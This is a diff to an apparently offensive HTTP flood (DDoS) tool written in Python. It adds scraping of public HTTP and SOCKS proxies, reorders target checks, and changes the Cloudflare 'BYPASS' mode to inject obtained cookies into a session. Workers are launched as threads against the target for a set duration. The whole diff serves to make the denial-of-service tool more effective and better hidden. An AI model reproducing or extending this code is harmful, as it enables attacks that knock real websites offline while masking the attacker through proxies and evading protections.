@@ -28,6 +28,7 @@ else:
   parser.add_argument('-m',   '--method',         dest = 'method',          default = 'GET',    help='Method to use when attacking (default: GET)', type=str)
   parser.add_argument('-dfw', '--detect-firewall',dest = 'detect_firewall', default = False,    help='Detect if the target site is protected by a firewall', action='store_true')
   parser.add_argument(        '--http-version',   dest = 'version',         default = '1.1',    help='HTTP version (default: 1.1)', type=str)
+  parser.add_argument(        '--scrape-proxies', dest = 'scrape_proxies',  default = False,    help='Scrape proxies', action='store_true')
   args = vars(parser.parse_args())
 
   debug = args['debug']
@@ -66,6 +67,7 @@ try:
   from src.utils import *
   from src.attacks import *
   from src.core import *
+  from src.proxy import *
   if debug: 
     s_took = "%.2f" % (1000 * (timer() - s_start))
     print(f'[INFO] Importing depencies took {str(s_took)} ms.')
@@ -87,15 +89,6 @@ method_dict = {
   'BYPASS': http_cfbp, # cloudflare bypass
   'PROXY': http_proxy, # proxied http flood
 }
-
-if args['target'] is None:
-  print(f'[ERROR] No target specified.')
-  exit()
-
-if not attack_method.upper() in method_dict.keys():
-  print(f'[ERROR] Invalid method.')
-  exit()
-
 Core.bypass_cache = args['bypass_cache']
 Core.http_version = args['version']
 Core.proxy_file = args['proxy_file_path']
@@ -104,6 +97,17 @@ Core.proxy_type = args['proxy_type'].upper() # this here fixed the issue for IP 
 Core.proxy_user = args['proxy_user']
 Core.proxy_passw = args['proxy_pass']
 Core.proxy_resolve = args['proxy_resolve']
+
+if args['scrape_proxies']:
+  print(f'[INFO] Scraping {Core.proxy_type} proxies.')
+  proxies = scrape({'HTTP': 0, 'SOCKS4': 4, 'SOCKS5': 5}.get(Core.proxy_type))
+  print(f'[INFO] Loaded {str(len(proxies))} proxies.')
+  print(f'[INFO] Saving into file: {Core.proxy_type}.txt')
+  with open(f'{Core.proxy_type}.txt', 'w+', buffering=(2048*2048)) as fd:
+    [fd.write(f'{x.rstrip()}\n') for x in proxies if not '127.0.0.1' in x]
+  print('[INFO] Done.')
+
+  yorn = input('Do you want to check the proxies to see if they are alive?')
 
 if args['proxy'] != None and args['detect_firewall']:
   try: yorn = input('Detecting firewalls will leak the host lookup, are you sure you want to continue? ').upper()
@@ -114,6 +118,14 @@ if args['proxy'] != None and args['detect_firewall']:
   time.sleep(2) # a small timeout if the user reconsiders his choice so he can CTRL-C or close the tool
 
 init(autoreset=True) # initialize console
+
+if args['target'] is None:
+  print(f'[ERROR] No target specified.')
+  exit()
+
+if not attack_method.upper() in method_dict.keys():
+  print(f'[ERROR] Invalid method.')
+  exit()
 
 def main():
   print('')
@@ -160,27 +172,19 @@ def main():
   print(f' Keywords: [{str(len(keywords))}]')
 
 def attack():
-  parsed = urlparse(str(args['target']))
-  if args['proxy'] is None: # prevents leaks
-    resolved_host = socket.gethostbyname(str(parsed.netloc)) if (not isIPv4(parsed.netloc) and not isIPv6(parsed.netloc) and not parsed.netloc.endswith('.onion')) else parsed.netloc
-    if isIPv6(resolved_host): # small IPv6 check
-      resolved_host = f'[{resolved_host}]' # adding this allows requests to send data to IPv6 addresses too 
-  else: resolved_host = parsed.netloc
-
   HTTPConnection._http_vsn_str = f"HTTP/{str(Core.http_version)}" # sets HTTP version
 
   sessobj = createsession()
   if attack_method == 'BYPASS':
 
     if get_cookie(args['target']):
-      scraper = cloudscraper.create_scraper(sess=requests.session())
       jar = RequestsCookieJar()
       jar.set(Core.bypass_cookieJAR['name'], Core.bypass_cookieJAR['value'])
-      scraper.cookies = jar
 
-      sessobj = scraper
+      sessobj.cookies = jar
     else: 
-      print('Failed to get cookies'); os.kill(os.getpid(), 9)
+      print('[BYPASS] Failed to get cookies'); os.kill(os.getpid(), 9)
+    print('[BYPASS] Got cookies :3')
       
   elif attack_method == 'PROXY': # define the proxy type as session object (saves me some lines to code)
     sessobj = socks.SOCKS4 if 'SOCKS4' in Core.proxy_type else socks.HTTP if 'HTTP' in Core.proxy_type else socks.SOCKS5
@@ -189,7 +193,7 @@ def attack():
   s_start = timer() # timer used for counting avg rps
   for i in range(int(args['workers'])):
     Core.infodict.update({str(i): {'req_sent': 0, 'req_fail': 0, 'req_total':0}})
-    kaboom = threading.Thread(target=method_dict[attack_method], args=(str(i), sessobj, f'{parsed.scheme}://{resolved_host}', args['duration'], args['useragent'], args['referer'], ), daemon=True)
+    kaboom = threading.Thread(target=method_dict[attack_method], args=(str(i), sessobj, args['target'], args['duration'], args['useragent'], args['referer'], ), daemon=True)
     kaboom.start()
 
     Core.threadbox.append(kaboom)
